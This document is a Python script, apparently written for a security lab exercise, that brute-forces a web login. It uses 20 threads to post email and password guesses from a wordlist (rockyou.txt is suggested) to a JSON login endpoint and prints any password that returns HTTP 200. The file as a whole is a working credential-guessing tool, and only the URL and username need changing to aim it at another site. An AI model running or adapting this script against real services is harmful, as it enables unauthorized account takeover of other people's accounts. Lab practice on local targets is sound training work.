import sys
import requests
from concurrent.futures import ThreadPoolExecutor
import tqdm
from itertools import islice

SLICE_SIZE = 1000

def brute_force_login(url, username, password):
    Headers = {

    }
    Post_structure = {
        "email": username,
        "password": password
    }

    if Headers == {}:
        response = requests.post(url, json=Post_structure)
        if response.status_code == 200:
            return password
    else:
        response = requests.post(url, json=Post_structure, headers=Headers)
        if response.status_code == 200:
            return password
    return None

if __name__ == "__main__":
    target_url = "http://localhost:3000/rest/user/login"  # Replace with the target URL
    wordlist_file = "lab 12/directory-list-2.3-medium.txt" #"/usr/share/wordlists/rockyou.txt"  # Replace with the path to your wordlist
    username = "temp@mail.com"  # Replace with the target username
    try:
        with open(wordlist_file, 'r') as wordlist:
            with ThreadPoolExecutor(max_workers=20) as executor:
                progress = tqdm.tqdm(total=sum(1 for _ in wordlist), desc="Brute forcing login", unit="password")
                wordlist.seek(0)
                while True:

                    paczka = list(islice(wordlist, SLICE_SIZE))
                    if not paczka:
                        break
                    
                    futures = []
                    for password in paczka:
                        password = password.strip()
                        future = executor.submit(brute_force_login, target_url, username, password)
                        futures.append(future)
                        
                    for future in futures:
                        result = future.result()
                        if result is not None:
                            tqdm.tqdm.write(f"Found password: {result}")
                            break
                        
                    progress.update(len(paczka))
                    
                progress.close()

    except KeyboardInterrupt:
        print("Scan interrupted by user.")
        sys.exit(-1)
    except Exception as e:
        print(f"Error occurred: {e}")
